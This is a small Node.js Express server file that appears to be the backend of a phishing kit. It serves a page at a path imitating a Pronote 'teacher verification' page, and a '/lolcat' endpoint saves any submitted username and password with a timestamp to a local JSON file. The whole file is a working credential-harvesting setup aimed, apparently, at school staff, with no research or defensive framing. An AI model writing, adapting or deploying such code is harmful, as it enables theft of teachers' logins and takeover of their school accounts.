const express = require('express');
const bodyParser = require('body-parser');
const moment = require('moment');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.post('/lolcat', (req, res) => {
  const { uname, pwd } = req.body;
  const now = moment();
  let content = JSON.parse(fs.readFileSync('data.json', 'utf8'));
  content.push({ uname, pwd, timestamp: now.unix() });
  fs.writeFileSync('data.json', JSON.stringify(content));
  return res.status(200).json({ success: true, });
});

app.get('/pronote/verification-professeur.html', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.use('/images', express.static('images'));


app.listen(3007, () => {
  console.log('Server is running on port 3007');
});